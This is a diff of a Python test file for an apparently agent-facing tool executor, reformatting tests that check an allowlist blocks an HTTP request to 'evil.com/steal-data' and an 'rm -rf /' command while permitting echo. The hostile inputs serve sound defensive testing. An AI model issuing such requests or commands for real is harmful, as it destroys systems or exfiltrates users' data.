@@ -24,18 +24,24 @@ class TestToolExecutor:
     @pytest.mark.asyncio
     async def test_http_blocked_domain(self, executor: ToolExecutor) -> None:
         with pytest.raises(SecurityError, match="not in allowlist"):
-            await executor.execute("http_request", {
-                "method": "GET",
-                "url": "https://evil.com/steal-data",
-            })
+            await executor.execute(
+                "http_request",
+                {
+                    "method": "GET",
+                    "url": "https://evil.com/steal-data",
+                },
+            )
 
     @pytest.mark.asyncio
     async def test_command_blocked(self, executor: ToolExecutor) -> None:
         with pytest.raises(SecurityError, match="not in allowlist"):
-            await executor.execute("exec_command", {
-                "command": "rm",
-                "args": ["-rf", "/"],
-            })
+            await executor.execute(
+                "exec_command",
+                {
+                    "command": "rm",
+                    "args": ["-rf", "/"],
+                },
+            )
 
     @pytest.mark.asyncio
     async def test_allowed_command_executes(self) -> None:
@@ -43,10 +49,13 @@ class TestToolExecutor:
             allowed_domains=[],
             allowed_commands=["echo"],
         )
-        result = await executor.execute("exec_command", {
-            "command": "echo",
-            "args": ["hello"],
-        })
+        result = await executor.execute(
+            "exec_command",
+            {
+                "command": "echo",
+                "args": ["hello"],
+            },
+        )
         assert "hello" in result
         await executor.close()
 
@@ -56,19 +65,25 @@ class TestToolExecutor:
             allowed_domains=[],
             allowed_commands=[],  # empty = allow all
         )
-        result = await executor.execute("exec_command", {
-            "command": "echo",
-            "args": ["test"],
-        })
+        result = await executor.execute(
+            "exec_command",
+            {
+                "command": "echo",
+                "args": ["test"],
+            },
+        )
         assert "test" in result
         await executor.close()
 
     @pytest.mark.asyncio
     async def test_knowledge_search_returns_json(self) -> None:
         executor = ToolExecutor()
-        result = await executor.execute("knowledge_search", {
-            "query": "test query",
-            "workspace_id": "ws_1",
-        })
+        result = await executor.execute(
+            "knowledge_search",
+            {
+                "query": "test query",
+                "workspace_id": "ws_1",
+            },
+        )
         assert "not_implemented" in result
         await executor.close()
